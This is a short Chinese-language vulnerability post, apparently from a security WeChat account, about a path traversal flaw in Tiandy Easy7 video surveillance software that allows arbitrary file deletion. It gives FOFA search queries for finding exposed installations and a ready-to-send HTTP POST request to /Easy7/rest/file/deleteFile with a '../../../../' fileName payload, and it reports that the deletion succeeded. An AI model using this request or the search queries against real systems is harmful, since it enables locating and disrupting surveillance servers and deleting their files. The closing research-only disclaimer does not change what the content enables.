#  天地伟业Easy7 /Easy7/rest/file/deleteFile 文件删除漏洞  
 0day收割机   2026-05-07 06:37  
  
# 漏洞简介  
  
天地伟业Easy7是一款用于视频监控管理的  
软件  
系统。  
  
该系统的/Easy7/rest/file/deleteFile接口在处理文件删除请求时，直接将用户传入的参数与预设路径拼接，且未对路径回溯符（../）进行任何过滤或校验。这使得攻击者可以跳出预设的存储目录，删除服务器上任意位置的、且应用进程有权操作的文件，可能导致系统崩溃或业务中断。  
# 影响版本  
# fofa语法  
> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"  
  
# 漏洞复现  
> 删除之前上传的一个文本为例，通过可控fileName多级目录穿越即可穿越到任意目录，同时支持两种场景。  
  
```
POST /Easy7/rest/file/deleteFile HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

fileName=../../../../root/srsPath/1.txt&uploadPicturePath=/
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWB6OMLH1JkoUyfhg0065lsbCO9MtB8x6ALXzDef2fPEcXs9cLx2MEfa3MictsLTyp8q9NDIibJGL5HApDicU1gcJAXDMDdSo9DvbE/640?wx_fmt=png&from=appmsg "")  
  
成功删除  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
